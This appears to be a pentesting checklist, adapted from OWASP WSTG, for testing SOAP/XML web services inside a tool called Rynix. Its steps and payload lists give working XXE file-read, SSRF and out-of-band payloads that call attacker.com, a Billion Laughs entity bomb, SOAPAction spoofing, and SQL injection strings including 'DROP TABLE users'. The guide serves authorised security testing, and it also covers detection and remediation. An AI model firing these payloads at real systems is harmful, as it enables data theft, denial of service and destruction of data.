---
id: WSTG-APIT-03
title: Testing SOAP/XML Web Services
category: API Testing
severity_range: Low-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/03-Testing_SOAP_XML_Web_Services
---

# WSTG-APIT-03: Testing SOAP/XML Web Services

## Summary

SOAP (Simple Object Access Protocol) web services use XML-based messaging over HTTP to expose application functionality. Security concerns include exposed WSDL files that reveal all available operations, XML injection and XXE (XML External Entity) attacks through crafted XML payloads, SOAP action spoofing to bypass authorization, WS-Security implementation weaknesses, and XML-based denial of service through entity expansion (Billion Laughs) or oversized payloads.

## Test Objectives

- Discover WSDL files and enumerate available web service operations
- Test for XML injection and XXE in SOAP requests
- Test SOAP action spoofing to bypass access controls
- Assess WS-Security implementation (if present)
- Test for XML-based denial of service attacks
- Verify input validation on SOAP parameters

## Prerequisites

- Target application exposes SOAP/XML web services
- Docker pentest container capturing traffic
- WSDL location identified or service endpoints discovered

## Test Steps

### Step 1: Discover WSDL Files

**CLI Actions:**
Use `curl` to probe for WSDL files:

```
GET /service?wsdl HTTP/1.1
Host: target.com
```

```
GET /service?WSDL HTTP/1.1
Host: target.com
```

```
GET /ws/service.wsdl HTTP/1.1
Host: target.com
```

```
GET /services HTTP/1.1
Host: target.com
```

```
GET /axis2/services/listServices HTTP/1.1
Host: target.com
```

Common WSDL paths:
```
/service?wsdl
/service?singleWsdl
/service.asmx?wsdl
/Service.svc?wsdl
/ws/Service?wsdl
```

If a WSDL is found, use `curl` to download it and analyze the available operations, input parameters, and data types.

### Step 2: Enumerate Operations from WSDL

**CLI Actions:**
After downloading the WSDL, use `save to manual-review file` to craft requests for each discovered operation:

```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://target.com/GetUser"

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:ns="http://target.com/service">
  <soap:Header/>
  <soap:Body>
    <ns:GetUser>
      <ns:userId>1001</ns:userId>
    </ns:GetUser>
  </soap:Body>
</soap:Envelope>
```

Test all discovered operations, especially those that appear to be administrative or sensitive.

### Step 3: Test XXE (XML External Entity) Injection

**CLI Actions:**
Use `curl` to send SOAP requests with XXE payloads:

File read:
```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://target.com/GetUser"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:ns="http://target.com/service">
  <soap:Body>
    <ns:GetUser>
      <ns:userId>&xxe;</ns:userId>
    </ns:GetUser>
  </soap:Body>
</soap:Envelope>
```

SSRF:
```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

Blind XXE via out-of-band:
```
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

### Step 4: Test SOAP Action Spoofing

**CLI Actions:**
Use `curl` to change the SOAPAction header while keeping the SOAP body the same:

Original (authorized) request:
```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml
SOAPAction: "http://target.com/GetUser"

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser><userId>1001</userId></GetUser>
  </soap:Body>
</soap:Envelope>
```

Spoofed SOAPAction:
```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml
SOAPAction: "http://target.com/GetAllUsers"

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser><userId>1001</userId></GetUser>
  </soap:Body>
</soap:Envelope>
```

If the server routes based on SOAPAction header without validating it matches the body, this can bypass authorization checks on specific operations.

Also test with empty SOAPAction:
```
SOAPAction: ""
```

### Step 5: Test XML Injection

**CLI Actions:**
Use `curl` to inject XML elements into SOAP parameters:

```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml
SOAPAction: "http://target.com/GetUser"

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:ns="http://target.com/service">
  <soap:Body>
    <ns:GetUser>
      <ns:userId>1001</ns:userId><ns:role>admin</ns:role>
    </ns:GetUser>
  </soap:Body>
</soap:Envelope>
```

Test CDATA injection:
```
<ns:userId><![CDATA[1001]]></ns:userId>
```

Test XML comment injection:
```
<ns:userId>1001<!-- injected --></ns:userId>
```

### Step 6: Test XML Bomb (Billion Laughs DoS)

**CLI Actions:**
Use `curl` to test entity expansion DoS (use with caution, may crash the server):

```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&lol3;</data>
  </soap:Body>
</soap:Envelope>
```

Note: Only use minimal expansion for testing. A full Billion Laughs payload can cause severe DoS.

### Step 7: Test WS-Security Implementation

**CLI Actions:**
Use `curl` to test WS-Security headers:

Test with missing security header:
```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetData/>
  </soap:Body>
</soap:Envelope>
```

Test with expired timestamp:
```
<soap:Header>
  <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
    <wsu:Timestamp xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <wsu:Created>2020-01-01T00:00:00Z</wsu:Created>
      <wsu:Expires>2020-01-01T00:05:00Z</wsu:Expires>
    </wsu:Timestamp>
  </wsse:Security>
</soap:Header>
```

Test with modified username token:
```
<wsse:UsernameToken>
  <wsse:Username>admin</wsse:Username>
  <wsse:Password>test</wsse:Password>
</wsse:UsernameToken>
```

### Step 8: Test SQL Injection in SOAP Parameters

**CLI Actions:**
Use `curl` to test SQL injection through SOAP parameters:

```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml
SOAPAction: "http://target.com/GetUser"

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>1001' OR 1=1--</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

```
<GetUser>
  <userId>1001' UNION SELECT username,password FROM users--</userId>
</GetUser>
```

Use `rynix_plugin_run('template-scan')` to check for SOAP/XML service findings.

## Payloads

### XXE Payloads
```xml
<!-- File read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

<!-- Blind XXE (OOB) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>

<!-- PHP filter -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

<!-- Parameter entity -->
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>
```

### SOAP Action Values to Test
```
""                              (empty action)
"http://target.com/AdminOp"     (admin operation)
"http://target.com/GetAllData"  (data dump operation)
"randomvalue"                   (invalid action)
```

### XML Injection Payloads
```xml
<!-- Element injection -->
<userId>1001</userId><role>admin</role>

<!-- CDATA injection -->
<userId><![CDATA[1001' OR 1=1--]]></userId>

<!-- Namespace injection -->
<userId xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="string">admin</userId>

<!-- Comment injection -->
<userId>1001<!-- comment --></userId>
```

### SQL Injection in SOAP
```
' OR 1=1--
' UNION SELECT NULL--
'; DROP TABLE users;--
1 AND 1=2 UNION SELECT username,password FROM users--
```

### WSDL Discovery Paths
```
/service?wsdl
/service?WSDL
/service?singleWsdl
/service.asmx?wsdl
/Service.svc?wsdl
/Service.svc?singleWsdl
/ws/service.wsdl
/axis2/services/listServices
/cxf/services
```

### WS-Security Bypass
```xml
<!-- Missing security header -->
<!-- Expired timestamp -->
<!-- Replayed message with same nonce -->
<!-- Modified signature -->
<!-- Removed signature, kept unsigned body -->
```

## Detection Criteria

A finding should be logged when:
- WSDL files are publicly accessible without authentication
- XXE attacks succeed in extracting files or making SSRF requests
- SOAP action spoofing bypasses operation-level authorization
- XML injection modifies the intended operation or data
- SQL injection succeeds through SOAP parameters
- WS-Security tokens can be bypassed, replayed, or forged
- Entity expansion causes denial of service
- Administrative operations are accessible without proper authentication

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| XXE achieves file read or SSRF | High |
| SQL injection via SOAP parameters | High |
| SOAP action spoofing bypasses authorization for admin operations | High |
| WS-Security bypass allows unauthenticated access | High |
| XML bomb causes server denial of service | Medium |
| WSDL exposed with detailed internal operation information | Medium |
| XML injection modifies query behavior but limited impact | Medium |
| Expired WS-Security timestamps accepted | Medium |
| WSDL accessible but only basic operations disclosed | Low |
| Verbose SOAP fault messages reveal internal details | Low |
| XXE attempted but external entities disabled | Not a finding |

## Remediation

- Disable XML external entity processing in all XML parsers
- Set entity expansion limits to prevent Billion Laughs attacks
- Restrict WSDL access: require authentication or disable in production
- Validate SOAPAction header matches the actual operation in the SOAP body
- Implement operation-level authorization, not just endpoint-level
- Validate and sanitize all SOAP parameter values
- Use parameterized queries for database operations
- Implement WS-Security with proper timestamp validation and nonce checking
- Set XML parser limits: maximum element depth, maximum attributes, maximum document size
- Use schema validation to reject unexpected elements in SOAP messages
- Return generic SOAP faults without internal error details
- Keep SOAP framework and libraries updated to patch known vulnerabilities

## References

- [OWASP Testing Guide - SOAP/XML Web Services](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/03-Testing_SOAP_XML_Web_Services)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [CWE-776: Improper Restriction of Recursive Entity References in DTDs](https://cwe.mitre.org/data/definitions/776.html)
- [WS-Security Specification](https://docs.oasis-open.org/wss-m/wss/v1.1.1/wss-v1.1.1.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V13 API and Web Service — schema, auth, and rate limiting.
- V4 Access Control — BOLA/IDOR on API object references.

## CWE references

- CWE-285: Improper Authorization
- CWE-770: Allocation of Resources Without Limits

## Rynix tooling

- Primary tools: ``list_api_routes``, ``export_openapi_stub``, ``run_idor_matrix``, ``http_probe``

## Test focus

- Diff OpenAPI spec vs live routes from `analyze_repo`.
- Test batch/GraphQL endpoints for authorization per field.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

